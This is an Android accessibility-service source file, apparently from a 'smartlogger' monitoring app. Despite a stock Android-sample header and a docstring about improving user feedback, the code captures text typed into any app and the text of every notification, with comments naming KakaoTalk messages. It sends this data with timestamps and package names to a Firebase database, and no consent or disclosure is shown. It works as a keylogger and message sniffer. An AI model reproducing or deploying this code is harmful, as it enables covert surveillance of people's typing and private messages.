/*
 * Copyright (C) 2011 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

package smartmonitor.google.com.smartlogger;


import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.speech.tts.TextToSpeech.OnInitListener;
import android.text.format.DateFormat;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import java.util.Date;

import smartmonitor.google.com.smartlogger.Data.AccessibilityData;
import smartmonitor.google.com.smartlogger.writer.DataWritingInterface;
import smartmonitor.google.com.smartlogger.writer.FirebaseDBWriter;

/**
 * This class demonstrates how an accessibility service can query
 * window content to improve the feedback given to the user.
 */
public class MyAccessibilityService extends AccessibilityService implements OnInitListener {
    AccessibilityServiceInfo info;
    DataWritingInterface writer;
    private final String TAG = "AccessTest";
    private String dataFormatYMDhms = "MM/dd hh:mm";
    private DateFormat dateFormat;
    /**
     * Tag for logging.
     */
    private static final String LOG_TAG = "onAccessibilityEvent";


    /**
     * Processes an AccessibilityEvent, by traversing the View's tree and
     * putting together a message to speak to the user.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!event.getText().toString().equals("[]")) {
            writer.write(new AccessibilityData(getPrettyString(event)));
        } else {
            //do nothing
        }
    }

    private String getPrettyString(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            return getDate(System.currentTimeMillis()) + " " + event.getPackageName() + " " + event.getText();
        } else {
            // AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
            return getDate(System.currentTimeMillis()) + " " + event.getPackageName() + " NOTI " + event.getText();
        }
    }

    private String getDate(long milliSeconds) {
        return dateFormat.format(dataFormatYMDhms, new Date(milliSeconds)).toString();
    }

    // 접근성 권한을 가지고, 연결이 되면 호출되는 함수
    public void onServiceConnected() {
        writer = FirebaseDBWriter.getInstance();
        info = new AccessibilityServiceInfo();
        dateFormat = new DateFormat();

        //TYPE_VIEW_TEXT_SELECTION_CHANGED //텍스트 입력시
        //TYPE_NOTIFICATION_STATE_CHANGED //노티 도착시
        //TYPE_VIEW_CLICKED //카톡방 새로운 글
        //info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK; // 전체 이벤트 가져오기
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FEEDBACK_HAPTIC;
        info.notificationTimeout = 100; // millisecond

        setServiceInfo(info);
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public void onInterrupt() {
        /* do nothing */
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public void onInit(int status) {
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        return false;
    }
}


//        Log.e(TAG, "Catch Event Time: " + getDate(event.getEventTime()));
//Log.e(TAG, "Catch Event Type: " + AccessibilityEvent.eventTypeToString(event.getEventType()));
//        Log.e(TAG, "Catch Event Package Name : " + event.getPackageName());
//        Log.e(TAG, "Catch Event TEXT : " + event.getText());
//Log.e(TAG, "Catch Event ContentDescription  : " + event.getContentDescription());
//        //Log.e(TAG, "Catch Event getSource : " + event.getSource());
//Log.e(TAG, "=========================================================================");